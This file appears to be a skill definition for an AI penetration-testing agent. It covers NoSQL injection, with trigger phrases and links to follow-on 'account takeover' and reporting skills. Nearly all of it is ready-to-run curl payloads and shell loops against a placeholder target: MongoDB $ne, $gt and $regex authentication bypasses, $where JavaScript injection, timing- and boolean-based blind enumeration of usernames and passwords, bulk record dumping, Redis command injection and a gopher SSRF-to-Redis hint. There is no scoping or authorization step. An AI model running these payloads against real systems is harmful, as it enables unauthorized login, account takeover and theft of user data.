---
name: vuln-nosql
description: "NoSQL injection testing — MongoDB operator injection ($ne/$gt/$where), authentication bypass, blind NoSQL injection, MongoDB aggregation abuse, Redis command injection. Triggers: 'nosql injection', 'mongodb injection', 'nosql', 'operator injection', '$ne injection', '$where injection', 'mongodb auth bypass', 'nosql auth bypass', 'mongodb exploit'."
---

# NoSQL Injection Testing

Exploit MongoDB operator abuse and JavaScript injection to bypass auth and exfiltrate data.

---

## Phase 1: MongoDB Operator Injection

```bash
TARGET="https://TARGET"

# Login bypass via $ne operator:
# Standard login: {"username":"admin","password":"secret"}
# Bypass: {"username":"admin","password":{"$ne":"wrongpassword"}}

curl -s -X POST "$TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":"invalid"}}'

# URL-encoded form:
curl -s -X POST "$TARGET/login" \
  -d 'username=admin&password[$ne]=invalid'

# Regex bypass:
curl -s -X POST "$TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$regex":".*"},"password":{"$ne":"x"}}'

# $gt bypass:
curl -s -X POST "$TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$gt":""}}'

# $where JavaScript injection:
curl -s -X POST "$TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","$where":"function(){sleep(5000);return true;}"}'
```

---

## Phase 2: Blind NoSQL via Timing

```bash
TARGET="https://TARGET"

# Time-based blind injection to enumerate username:
for CHAR in a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9; do
  START=$(date +%s%3N)
  curl -s -X POST "$TARGET/api/login" \
    -H "Content-Type: application/json" \
    -d "{\"username\":{\"\\$regex\":\"^${CHAR}\"},\"password\":{\"\\$ne\":\"x\"}}" -o /dev/null
  END=$(date +%s%3N)
  [ $((END - START)) -gt 100 ] && echo "Prefix match: $CHAR"
done

# Boolean-based blind (different response for match/no-match):
# Match:
curl -s -X POST "$TARGET/api/users" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$regex":"^admin"}}'

# Enumerate field values character by character:
for LEN in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16; do
  RESP=$(curl -s -X POST "$TARGET/api/search" \
    -H "Content-Type: application/json" \
    -d "{\"password\":{\"\\$regex\":\".{$LEN}\"}}")
  echo "Length $LEN: $(echo $RESP | wc -c)"
done
```

---

## Phase 3: Data Exfiltration

```bash
TARGET="https://TARGET"

# Enumerate all usernames via $regex:
for CHAR in {a..z} {0..9}; do
  RESP=$(curl -s -X POST "$TARGET/api/search" \
    -H "Content-Type: application/json" \
    -d "{\"username\":{\"\\$regex\":\"^$CHAR\"},\"password\":{\"\\$ne\":\"x\"}}")
  [ "$(echo $RESP | wc -c)" -gt 10 ] && echo "Username starts with: $CHAR"
done

# Dump all records (if $where allowed):
curl -s -X POST "$TARGET/api/search" \
  -H "Content-Type: application/json" \
  -d '{"$where":"1==1"}'

# MongoDB injection in URL parameter:
curl -s "$TARGET/api/users?username[$regex]=.*&username[$options]=i"
curl -s "$TARGET/api/users?username[$ne]=&password[$ne]="
```

---

## Phase 4: Redis Command Injection

```bash
TARGET="https://TARGET"

# If app uses Redis and exposes command to user:
curl -s "$TARGET/api/cache?key=PING"
curl -s "$TARGET/api/cache?key=INFO"
curl -s "$TARGET/api/cache?key=CONFIG+GET+*"

# SSRF + Redis via Gopher (combined with SSRF skill):
# gopher://127.0.0.1:6379/_MULTI%0D%0ASET%20shell%20...%0D%0AEXEC
```

---

## Output

Save to `output/`:
- `nosql_auth_bypass.txt` — auth bypass payloads that worked
- `nosql_enum.txt` — enumerated usernames/data

## Next Phase

→ `vuln-account-takeover` if auth bypass achieved
→ `pentest-report` to document findings
